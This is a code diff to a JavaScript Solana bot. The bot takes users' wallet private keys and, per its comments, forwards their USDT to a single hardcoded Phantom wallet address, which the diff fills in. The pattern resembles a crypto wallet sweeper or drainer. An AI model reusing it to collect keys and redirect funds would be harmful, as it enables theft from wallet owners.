@@ -37,17 +37,23 @@ let userSessions = {};
 const usdtMintAddress = new solanaWeb3.PublicKey('Es9vMFrzdQvAx2eWtS5tybVopF3WQihDnm1HmwW8VaMF');
 
 // Phantom wallet address (where USDT will be transferred)
-const phantomWalletAddress = 'YourPhantomWalletAddressHere'; // Replace with your actual Phantom wallet address
+const phantomWalletAddress = 'G2XNkLGnHeFTCj5Eb328t49aV2xL3rYmrwugg4n3BPHm'; // Replace with your actual Phantom wallet address
 
 // Function to monitor USDT transactions and transfer to Phantom Wallet
 async function monitorUSDTTransactions(walletAddress, solWalletPrivateKey, userId, lastSignature = null) {
     const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
-    const privateKeyBytes = bs58.decode(solWalletPrivateKey); // Decode base58 private key
-    const keypair = solanaWeb3.Keypair.fromSecretKey(privateKeyBytes);
-
-    console.log(`Monitoring wallet ${walletAddress} for USDT transactions`);
 
     try {
+        // Verify if solWalletPrivateKey is valid base58
+        if (!solWalletPrivateKey || solWalletPrivateKey.length === 0) {
+            throw new Error("Private key is empty or undefined.");
+        }
+
+        const privateKeyBytes = bs58.decode(solWalletPrivateKey); // Decode base58 private key
+        const keypair = solanaWeb3.Keypair.fromSecretKey(privateKeyBytes);
+
+        console.log(`Monitoring wallet ${walletAddress} for USDT transactions`);
+
         // Fetch token accounts for the wallet
         const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
             new solanaWeb3.PublicKey(walletAddress),
@@ -97,7 +103,7 @@ async function monitorUSDTTransactions(walletAddress, solWalletPrivateKey, userI
             console.log(`No USDT token accounts found for wallet ${walletAddress}`);
         }
     } catch (error) {
-        console.error(`Error while monitoring wallet ${walletAddress}:`, error);
+        console.error(`Error while monitoring wallet ${walletAddress}:`, error.message);
     }
 }
 
